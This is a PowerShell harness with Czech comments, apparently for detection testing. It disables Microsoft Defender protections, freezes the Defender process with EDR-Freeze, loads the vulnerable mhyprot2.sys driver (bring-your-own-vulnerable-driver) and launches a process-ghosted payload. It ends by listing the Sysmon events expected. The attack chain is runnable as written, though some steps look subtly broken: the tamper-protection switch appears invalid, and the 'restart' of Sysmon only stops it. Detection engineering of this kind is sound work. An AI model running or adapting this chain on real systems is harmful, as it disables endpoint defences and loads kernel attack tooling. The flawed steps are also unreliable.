#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Lokální orchestrátor pro testování detekce BYOVD/EDR-Freeze/Process Ghosting.
    Předpokládá ručně stažené PoC v C:\PoC\. Žádné stahování!
#>

$PoCBase = "C:\PoC"
$LogFile = "$PoCBase\test_harness.log"

function Write-TestLog {
    param([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$Timestamp - $Message" | Out-File -FilePath $LogFile -Append -Encoding utf8
    Write-Host $Message -ForegroundColor Cyan
}

# 1. Kontrola předpokladů
$RequiredPaths = @(
    "$PoCBase\EDR-Freeze\edr_freeze.exe",
    "$PoCBase\BYOVD\mhyprot2.sys",
    "$PoCBase\BYOVD\loader.exe",  # Nahraď svým loaderem (např. sc.exe create / load)
    "$PoCBase\Ghosting\ghosted.exe"
)

foreach ($Path in $RequiredPaths) {
    if (-not (Test-Path $Path)) {
        Write-Error "Chybí soubor: $Path. Stáhni ručně z GitHubu a zkompiluj!"
        exit 1
    }
}

# 2. Dočasné vypnutí Defenderu (pro testy)
Write-TestLog "=== PŘÍPRAVA: Vypínám Defender Real-time + Tamper Protection ==="
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableTamperProtection $true
Start-Sleep 5

Write-TestLog "=== TEST 1: EDR-Freeze ==="
$Proc = Start-Process -FilePath "$PoCBase\EDR-Freeze\edr_freeze.exe" -ArgumentList "-target MsMpEng.exe" -PassThru -WindowStyle Hidden
$Proc.WaitForExit()
Write-TestLog "EDR-Freeze PID: $($Proc.Id), ExitCode: $($Proc.ExitCode). Čekám 30s na logy..."
Start-Sleep 30

Write-TestLog "=== TEST 2: BYOVD (mhyprot2.sys) ==="
# Příklad loadování driveru (nahraď svým loaderem)
& "$PoCBase\BYOVD\loader.exe" "$PoCBase\BYOVD\mhyprot2.sys"
Write-TestLog "BYOVD loader spuštěn. Čekám 60s na EID 6 / 7045..."
Start-Sleep 60

Write-TestLog "=== TEST 3: Process Ghosting ==="
$GhostProc = Start-Process -FilePath "$PoCBase\Ghosting\ghosted.exe" -ArgumentList "calc.exe", "$PoCBase\payload.exe" -PassThru -WindowStyle Hidden  # Nahraď payload.exe svým test souborem
$GhostProc.WaitForExit()
Write-TestLog "Ghosting PID: $($GhostProc.Id), ExitCode: $($GhostProc.ExitCode). Čekám 30s na EID 1/23/25..."
Start-Sleep 30

# 4. Cleanup a obnovení Defenderu
Write-TestLog "=== CLEANUP ==="
Stop-Service Sysmon -Force -ErrorAction SilentlyContinue  # Restart Sysmon pro čistotu
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableTamperProtection $false

Write-TestLog "=== TEST DOKONČEN. Zkontroluj logy v Fluent Bit / LLM backendu a $LogFile ==="
Write-Host "Očekávané eventy:"
Write-Host "- BYOVD: Sysmon EID 6 + System 7045"
Write-Host "- EDR-Freeze: Sysmon EID 10 (Process Access na MsMpEng)"
Write-Host "- Ghosting: Sysmon EID 1 + 23/25 (Tampering)"
